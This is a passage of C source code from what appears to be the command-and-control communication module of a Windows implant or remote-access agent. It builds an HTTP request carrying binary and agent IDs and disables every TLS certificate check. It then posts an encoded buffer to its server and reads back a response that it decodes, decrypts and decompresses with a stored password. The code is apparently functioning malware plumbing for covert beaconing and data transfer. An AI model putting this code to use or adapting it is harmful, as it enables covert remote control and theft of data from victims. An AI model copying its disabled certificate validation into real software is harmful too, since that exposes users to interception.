				NULL, 
				dwFlags, 
				0
			);
			if ( hRequest == NULL)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("m_InternetConnect_HttpOpenRequestA( %p, %p, %p, %p, %p, %p, %08x, %p ) failed. (%08x)\n"),
					g_InternetConnect_hConnectHandle,
					lpszVerb,
					g_InternetConnect_szUri,
					NULL,
					NULL,
					NULL,
					dwFlags,
					0,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("hRequest:        %p"), hRequest);

			
			// Check if we need to set the additional SSL options
			if (TRUE == g_InternetConnect_bSecure)
			{
				DWORD dwSecureFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID
					| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
					| SECURITY_FLAG_IGNORE_WRONG_USAGE
					| SECURITY_FLAG_IGNORE_UNKNOWN_CA
					| SECURITY_FLAG_IGNORE_REVOCATION;

				DBGPRINT(
					DEBUG_VERBOSE,
					TEXT("m_InternetConnect_InternetSetOptionA( %p, %08x, %p, %08x )"),
					hRequest,
					INTERNET_OPTION_SECURITY_FLAGS,
					&dwSecureFlags,
					sizeof(dwSecureFlags)
				);
				if ( FALSE == m_InternetConnect_InternetSetOptionA(
					hRequest,
					INTERNET_OPTION_SECURITY_FLAGS, 
					&dwSecureFlags, 
					sizeof(dwSecureFlags)
				)
					)
				{
					dwErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR, 
						TEXT("m_InternetConnect_InternetSetOptionA( %p, %08x, %p, %08x ) failed. (%08x)\n"),
						hRequest,
						INTERNET_OPTION_SECURITY_FLAGS,
						&dwSecureFlags,
						sizeof(dwSecureFlags),
						dwErrorCode
					);
					__leave;
				}
			}


			// Set up headers
			ZeroMemory(lpszHeaders, INTERNET_MAX_PATH_LENGTH);

			sprintf_s(lpszHeaders, INTERNET_MAX_PATH_LENGTH, INTERNETCONNECT_HEADER_FORMAT_STRING, g_InternetConnect_dwBinaryId, g_InternetConnect_dwAgentId);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpszHeaders:        %p"), lpszHeaders);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpszHeaders:        %S"), lpszHeaders);
					   			 
			dwOptionalLength = dwEncodedSendBufferSize;
			if (0 != dwOptionalLength)
			{
				lpOptional = lpEncodedSendBuffer;
			}
			else
			{
				lpOptional = NULL;
			}
			

			// Send HTTP request
			DBGPRINT(DEBUG_INFO, TEXT("Send the HTTP request containing to %d bytes..."), dwOptionalLength);
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_HttpSendRequestA( %p, %p, %08x, %p, %08x )"),
				hRequest,
				lpszHeaders,
				-1L,		
				lpOptional,	
				dwOptionalLength
			);
			if (FALSE == m_InternetConnect_HttpSendRequestA(
				hRequest,
				lpszHeaders,		// addtional headers to append to request
				-1L,				// -1L means zero-terminated (ASCIIZ)
				lpOptional,			// generally only used for POST and PUT
				dwOptionalLength	// size of optional in bytes
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InternetConnect_HttpSendRequestA( %p, %p, %08x, %p, %08x ) failed. (%08x)\n"),
					hRequest,
					lpszHeaders,
					-1L,
					lpOptional,
					dwOptionalLength,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_HttpSendRequestA( %p, %p, %08x, %p, %08x ) was successful."),
				hRequest,
				lpszHeaders,
				-1L,
				lpOptional,
				dwOptionalLength
			);


			// Check HTTP response
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_HttpQueryInfoA( %p, %08x, %p, %p, %p )"),
				hRequest,
				HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
				&dwResponseStatusCode,
				&dwResponseStatusCodeSize,
				&dwIndex
			);
			if (FALSE == m_InternetConnect_HttpQueryInfoA(
				hRequest,
				HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
				&dwResponseStatusCode, 
				&dwResponseStatusCodeSize,
				&dwIndex
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InternetConnect_HttpQueryInfoA( %p, %08x, %p, %p, %p ) failed. (%08x)\n"),
					hRequest,
					HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
					&dwResponseStatusCode,
					&dwResponseStatusCodeSize,
					&dwIndex,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("HTTP_QUERY_STATUS_CODE:        %d"), dwResponseStatusCode);

			if (HTTP_STATUS_OK != dwResponseStatusCode)
			{
				dwErrorCode = ERROR_NETWORK_UNREACHABLE;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("Server returned response code: %d"),
					dwResponseStatusCode
				);
				__leave;
			}

						
			// Loop through and read all the bytes in the response
			// Initialize the temporary variables
			ZeroMemory( lpTempBuffer, INTERNET_MAX_PATH_LENGTH);
			dwAvailableBytes		= 0;
			dwBytesRead				= 0;
			dwResponseBufferSize	= 0;
			lpResponseBuffer		= NULL;
			dwOldBufferSize			= 0;
			lpOldBuffer				= NULL;
			
			// Actual loop querying if there is data available
			DBGPRINT(DEBUG_INFO, TEXT("Read the HTTP response..."));
			do {
				// Check if data available
				if (FALSE == m_InternetConnect_InternetQueryDataAvailable(
					hRequest,
					&dwAvailableBytes,
					0,
					0
				)
					)
				{
					dwErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("m_InternetConnect_InternetQueryDataAvailable( %p, %p, %d, %d ) failed. (%08x)\n"),
						hRequest,
						&dwAvailableBytes,
						0,
						0,
						dwErrorCode
					);
					__leave;
				}
				DBGPRINT(DEBUG_VERBOSE, TEXT("dwAvailableBytes:      %d"), dwAvailableBytes);

				// If there is more data available than our buffer, then only read our buffer size
				if (dwAvailableBytes > INTERNET_MAX_PATH_LENGTH)
					dwAvailableBytes = INTERNET_MAX_PATH_LENGTH;

				// Read the available data into our temp buffer
				if (FALSE == m_InternetConnect_InternetReadFile(
					hRequest,
					lpTempBuffer,
					dwAvailableBytes,
					&dwBytesRead
				)
					)
				{
					dwErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("m_InternetConnect_InternetReadFile( %p, %p, %d, %p ) failed. (%08x)\n"),
						hRequest,
						lpTempBuffer,
						dwAvailableBytes,
						&dwBytesRead,
						dwErrorCode
					);
					__leave;
				}
				DBGPRINT(DEBUG_VERBOSE, TEXT("dwBytesRead:           %d"), dwBytesRead);

				// Create a new total buffer that is big enough to hold the old contents plus the new contents
				dwOldBufferSize			= dwResponseBufferSize;
				lpOldBuffer				= lpResponseBuffer;
				dwResponseBufferSize	= dwOldBufferSize + dwBytesRead;
				
				DBGPRINT(
					DEBUG_VERBOSE,
					TEXT("ALLOC( %d, %p )"),
					dwResponseBufferSize,
					&lpResponseBuffer
				);
				dwErrorCode = ALLOC(dwResponseBufferSize, (LPVOID*)&lpResponseBuffer);
				if (ERROR_SUCCESS != dwErrorCode)
				{
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("ALLOC( %d, %p ) failed. (%08x)\n"),
						dwResponseBufferSize,
						&lpResponseBuffer,
						dwErrorCode
					);
					__leave;
				}
				DBGPRINT(DEBUG_VERBOSE, TEXT("dwResponseBufferSize:  %d"), dwResponseBufferSize);
				DBGPRINT(DEBUG_VERBOSE, TEXT("lpResponseBuffer:      %p"), lpResponseBuffer);

				// If there were old contents, copy that over
				if (NULL != lpOldBuffer)
				{
					memcpy(lpResponseBuffer, lpOldBuffer, dwOldBufferSize);
					FREE(lpOldBuffer);
					lpOldBuffer = NULL;
				}

				// Copy the newly read contents into the total buffer
				memcpy(lpResponseBuffer + dwOldBufferSize, lpTempBuffer, dwBytesRead);

			} while ( 0 != dwBytesRead ); // Quit the loop when we there were no more bytes read

			DBGPRINT(DEBUG_VERBOSE, TEXT("FINAL dwResponseBufferSize:  %d"), dwResponseBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("FINAL lpResponseBuffer:      %p"), lpResponseBuffer);
			//printf("[%s(%d)] lpResponseBuffer:  %p", __FILE__, __LINE__, lpResponseBuffer);
			//for (DWORD dwResponseBufferIndex = 0; dwResponseBufferIndex < dwResponseBufferSize; dwResponseBufferIndex++)
			//{
			//	if (31 == (dwResponseBufferIndex % 32))
			//		printf("\n");
			//	printf("%02x ", lpResponseBuffer[dwResponseBufferIndex]);
			//}
			//printf("\n");
			//printf("[%s(%d)] lpResponseBuffer:\n%s\n", __FILE__, __LINE__, lpResponseBuffer);
			//printf("[%s(%d)] dwResponseBufferSize:  %d\n", __FILE__, __LINE__, dwResponseBufferSize);
			//printf("[%s(%d)] lpResponseBuffer:      %p\n", __FILE__, __LINE__, lpResponseBuffer);
			//for (DWORD dwResponseBufferIndex = 0; dwResponseBufferIndex < 4; dwResponseBufferIndex++)
			//{
			//	if (31 == (dwResponseBufferIndex % 32))
			//		printf("\n");
			//	printf("%02x ", lpResponseBuffer[dwResponseBufferIndex]);
			//}
			//printf(" ... ");
			//for (DWORD dwResponseBufferIndex = dwResponseBufferSize-4; dwResponseBufferIndex < dwResponseBufferSize; dwResponseBufferIndex++)
			//{
			//	if (31 == (dwResponseBufferIndex % 32))
			//		printf("\n");
			//	printf("%02x ", lpResponseBuffer[dwResponseBufferIndex]);
			//}
			//printf("\n");


			dwOldBufferSize		= dwResponseBufferSize;
			lpOldBuffer			= lpResponseBuffer;
			unsigned char* begin = lpOldBuffer;

			// Trim leading space
			while (isspace(*begin))
			{
				begin++;
				dwOldBufferSize--;
			}
			if ('\0' != (*begin))
			{
				unsigned char* end = (begin + dwOldBufferSize - 1);
				// Trim trailing space
				while ((end > begin) && (isspace(*end)))
				{
					end--;
					dwOldBufferSize--;
				}
				end[1] = '\0';
			}

			dwResponseBufferSize = dwOldBufferSize;
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("ALLOC( %d, %p )"),
				dwResponseBufferSize,
				&lpResponseBuffer
			);
			dwErrorCode = ALLOC(dwResponseBufferSize, (LPVOID*)&lpResponseBuffer);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ALLOC( %d, %p ) failed. (%08x)\n"),
					dwResponseBufferSize,
					&lpResponseBuffer,
					dwErrorCode
				);
				__leave;
			}

			// Copy the trimmed contents
			memcpy(lpResponseBuffer, begin, dwOldBufferSize);
			if (NULL != lpOldBuffer)
			{
				FREE(lpOldBuffer);
				lpOldBuffer = NULL;
			}
			//printf("[%s(%d)] dwResponseBufferSize:  %d\n", __FILE__, __LINE__, dwResponseBufferSize);
			//printf("[%s(%d)] lpResponseBuffer:      %p\n", __FILE__, __LINE__, lpResponseBuffer);
			//for (DWORD dwResponseBufferIndex = 0; dwResponseBufferIndex < 4; dwResponseBufferIndex++)
			//{
			//	if (31 == (dwResponseBufferIndex % 32))
			//		printf("\n");
			//	printf("%02x ", lpResponseBuffer[dwResponseBufferIndex]);
			//}
			//printf(" ... ");
			//for (DWORD dwResponseBufferIndex = dwResponseBufferSize - 4; dwResponseBufferIndex < dwResponseBufferSize; dwResponseBufferIndex++)
			//{
			//	if (31 == (dwResponseBufferIndex % 32))
			//		printf("\n");
			//	printf("%02x ", lpResponseBuffer[dwResponseBufferIndex]);
			//}
			//printf("\n");


			if (dwResponseBufferSize > 0)
			{
				// Decode, Decrypt, Decompress the buffer
				dwErrorCode = DecodeDecryptDecompressBuffer(
					lpResponseBuffer,
					dwResponseBufferSize,
					(LPBYTE)g_InternetConnect_szPassword,
					g_InternetConnect_dwPasswordSize,
					&lpDecodedResponseBuffer,
					&dwDecodedResponseBufferSize
				);
				if (ERROR_SUCCESS != dwErrorCode)
				{
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("DecodeDecryptDecompressBuffer( %p, %d, %p, %d, %p, %p ) failed. (%08x)\n"),
						lpResponseBuffer,
						dwResponseBufferSize,
						(LPBYTE)g_InternetConnect_szPassword,
						g_InternetConnect_dwPasswordSize,
						&lpDecodedResponseBuffer,
						&dwDecodedResponseBufferSize,
						dwErrorCode
					);
					__leave;
				}
			}


			DBGPRINT(DEBUG_VERBOSE, TEXT("dwDecodedResponseBufferSize:  %d"), dwDecodedResponseBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpDecodedResponseBuffer:      %p"), lpDecodedResponseBuffer);


			// Create the internet connect send response buffer
			//lpJsonInternetConnectSendResponseBuffer = cJSON_CreateBytes(lpResponseBuffer, dwResponseBufferSize);
			lpJsonInternetConnectSendResponseBuffer = cJSON_CreateBytes(lpDecodedResponseBuffer, dwDecodedResponseBufferSize);
			if (NULL == lpJsonInternetConnectSendResponseBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectSendResponseBuffer = cJSON_CreateBytes( %p, %d ) failed.\n"),
					lpDecodedResponseBuffer, dwDecodedResponseBufferSize
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonInternetConnectOutput, InternetConnect_Send_Response_Buffer, lpJsonInternetConnectSendResponseBuffer);

			if (NULL != lpResponseBuffer)
			{
				FREE(lpResponseBuffer);
				lpResponseBuffer = NULL;
			}
			dwResponseBufferSize = 0;


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szInternetConnectOutput = cJSON_Print(lpJsonInternetConnectOutput);
			if (NULL == szInternetConnectOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonInternetConnectOutput
				);
				__leave;
			}
			dwInternetConnectOutputSize = (DWORD)strlen(szInternetConnectOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwInternetConnectOutputSize: %d"), dwInternetConnectOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szInternetConnectOutput:     %p"), szInternetConnectOutput);
			//printf("szInternetConnectOutput:\n%s\n", szInternetConnectOutput);

			(*lppOutputBuffer) = (LPBYTE)szInternetConnectOutput;
			(*lpdwOutputBufferSize) = dwInternetConnectOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != hRequest)
			{
				DBGPRINT(
					DEBUG_VERBOSE,
					TEXT("m_InternetConnect_InternetCloseHandle( %p )"),
					hRequest
				);
				if (FALSE == m_InternetConnect_InternetCloseHandle(hRequest))
				{
					dwTempErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("m_InternetConnect_InternetCloseHandle( %p ) failed. (%08x)\n"),
						hRequest,
						dwTempErrorCode
					);
				}
				hRequest = NULL;
			}

			if (NULL != lpSendBuffer)
			{
				cJSON_free(lpSendBuffer);
				lpSendBuffer = NULL;
			}

			if (NULL != lpResponseBuffer)
			{
				FREE(lpResponseBuffer);
				lpResponseBuffer = NULL;
			}
			dwResponseBufferSize = 0;

			if (NULL != lpJsonInternetConnectInput)
			{
				cJSON_Delete(lpJsonInternetConnectInput);
				lpJsonInternetConnectInput = NULL;
			}

			if (NULL != lpJsonInternetConnectOutput)
			{
				cJSON_Delete(lpJsonInternetConnectOutput);
				lpJsonInternetConnectOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szInternetConnectOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();

	} // end except

	return dwErrorCode;
}
